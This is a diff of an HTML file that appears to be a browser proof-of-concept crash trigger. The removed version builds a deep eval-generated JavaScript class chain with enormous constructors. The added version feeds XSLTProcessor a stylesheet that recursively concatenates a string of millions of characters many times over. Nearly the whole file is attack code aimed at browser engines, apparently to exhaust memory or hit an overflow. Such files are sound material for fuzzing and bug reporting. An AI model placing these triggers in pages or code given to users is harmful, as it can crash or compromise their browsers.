@@ -1,32 +1,80 @@
 <html>
-<body>
-<script>
+	<head>
+		<script>
 
-const f = eval(`(function f(i) {
-	if (i == 0) {
-		class Derived extends Object {
-			constructor() {
-				super();
-				${"this.a=1;".repeat(0x3fffe-8)}
+
+			xsl = 
+			'<?xml version="1.0" encoding="UTF-8"?>\
+<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" version="1.0">\
+\
+\
+<xsl:template match="/">\
+    <!-- Start repeating -->\
+    <xsl:call-template name="repeatable" />\
+	<xsl:call-template name="repeatable" />\
+    <xsl:call-template name="repeatable" />\
+	<xsl:call-template name="repeatable" />\
+    <xsl:call-template name="repeatable" />\
+	<xsl:call-template name="repeatable" />\
+    <xsl:call-template name="repeatable" />\
+	<xsl:call-template name="repeatable" />\
+    <xsl:call-template name="repeatable" />\
+	<xsl:call-template name="repeatable" />\
+    <xsl:call-template name="repeatable" />\
+	<xsl:call-template name="repeatable" />\
+	<xsl:call-template name="repeatable" />\
+	<xsl:call-template name="repeatable" />\
+    <xsl:call-template name="repeatable" />\
+	<xsl:call-template name="repeatable" />\
+    <xsl:call-template name="repeatable" />\
+	<xsl:call-template name="repeatable" />\
+    <xsl:call-template name="repeatable" />\
+	<xsl:call-template name="repeatable" />\
+    <xsl:call-template name="repeatable" />\
+	<xsl:call-template name="repeatable" />\
+    <xsl:call-template name="repeatable" />\
+	<xsl:call-template name="repeatable" />\
+    <xsl:call-template name="repeatable" />\
+	<xsl:call-template name="repeatable" />\
+	<xsl:call-template name="repeatable" />\
+	<xsl:call-template name="repeatable" />\
+</xsl:template>\
+\
+<xsl:template name="repeatable">\
+    <xsl:param name="index" select="1" />\
+    <xsl:param name="total" select="20" />\
+\
+    <!-- Do something -->\
+	<xsl:value-of select="concat(&apos;'+Array(5614304).join("a")+'&apos;, &apos;&apos;, .)"/>\
+\
+    <xsl:if test="not($index = $total)">\
+        <xsl:call-template name="repeatable">\
+            <xsl:with-param name="index" select="$index + 1" />\
+        </xsl:call-template>\
+    </xsl:if>\
+</xsl:template>\
+\
+\
+</xsl:stylesheet>\
+';
+
+			xml = "<at></at>"
+
+			function loadXMLDocFromStr(str)
+			{
+				var parser = new DOMParser();
+				var doc = parser.parseFromString(str, "application/xml");
+				return doc;
 			}
-		}
 
-		return Derived;
-	}
+			xsl = loadXMLDocFromStr(xsl);
+			xml = loadXMLDocFromStr(xml);
 
-	class DerivedN extends f(i-1) {
-		constructor() {
-			super();
-			${"this.a=1;".repeat(0x40000-8)}
-		}
-	}
+			xsltProcessor = new XSLTProcessor();
 
-	return DerivedN;
-})`);
+			xsltProcessor.importStylesheet(xsl);
+			resultDocument = xsltProcessor.transformToFragment(xml, document);
 
-let a = new (f(0x7ff))();
-console.log(a);
-
-</script>
-</body>
+		</script>
+	</head>
 </html>
